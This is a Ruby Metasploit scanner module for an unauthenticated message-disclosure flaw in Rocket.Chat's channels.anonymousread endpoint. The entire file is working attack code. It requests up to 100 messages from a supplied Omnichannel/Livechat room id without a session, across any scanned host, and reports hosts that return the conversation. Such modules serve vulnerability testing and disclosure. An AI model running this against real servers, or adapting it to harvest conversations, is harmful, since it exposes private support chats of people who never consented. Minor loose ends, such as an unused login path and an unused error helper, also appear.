class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat channels.anonymousread Omnichannel disclosure scanner (VULN-047)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. With anonymous read on
          (Accounts_AllowAnonymousRead, a public-community setting),
          channels.anonymousread serves the messages of any room id to an
          unauthenticated caller, including Omnichannel (Livechat) conversations and
          hidden messages it should never expose. This scanner reads ROOMID with no
          session; a host is vulnerable when the conversation comes back. It only
          reads.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/channels.anonymousread']),
      OptString.new('ROOMID', [true, 'A Livechat/Omnichannel room id to read anonymously', 'GnRsZztZt8WnSr9vh'])
    ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'vars_get' => {
        'roomId' => "#{datastore['ROOMID']}",
        'count' => '100'
      }
    })
    unless res
      vprint_error("#{peer} - No response")
      return
    end

    hit = res.code == 200 && parse_json(res)['success'] == true
    unless hit
      vprint_status("#{peer} - Not vulnerable to VULN-047")
      return
    end

    print_good("#{peer} - Vulnerable: VULN-047")
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-047 confirmed by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end
end
